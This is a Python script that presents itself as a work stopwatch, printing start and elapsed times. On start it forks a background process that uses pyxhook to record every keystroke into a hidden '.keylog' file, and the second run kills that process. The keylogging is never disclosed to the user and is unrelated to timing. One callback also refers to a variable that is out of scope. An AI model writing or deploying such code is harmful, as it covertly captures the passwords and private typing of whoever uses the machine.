import time
import os
import datetime
import pyxhook
import threading
import signal

curr_time = time.time()

keylog_file='.keylog'
timelog_file='.timelog'

def OnKeyPress(event):
	fob=open(keylog_file,'a')
	fob.write(event.Key)
	fob.write('\n')
	if event.Ascii==96:
		fob.close()
		new_hook.cancel()

def start_keylogger():
	new_hook=pyxhook.HookManager()
	new_hook.KeyDown=OnKeyPress
	new_hook.HookKeyboard()
	new_hook.start()

try:
	fptr =open(".timelog" ,"r")
except:
	fptr=open(".timelog","w")
	fptr.write(str(curr_time))
	print("Stopwatch started at " + str(datetime.datetime.now()))
	pid=os.fork()
	if pid>0:
		print('Parent Process')
	else:
		id = os.getpid()
		command = 'echo '+str(id)+' > .pidlog'
		os.system(command)
		start_keylogger()
else:
	if fptr:
		prev_time=fptr.read()
		prev_time=float(prev_time)
		print("Stopwatch ended at " + str(datetime.datetime.now()))
		print("Worked for ",curr_time-prev_time)
		os.remove(".timelog")
		fptr=open(".pidlog","r")
		id = fptr.read()
		print(id)
		os.system('kill '+ id)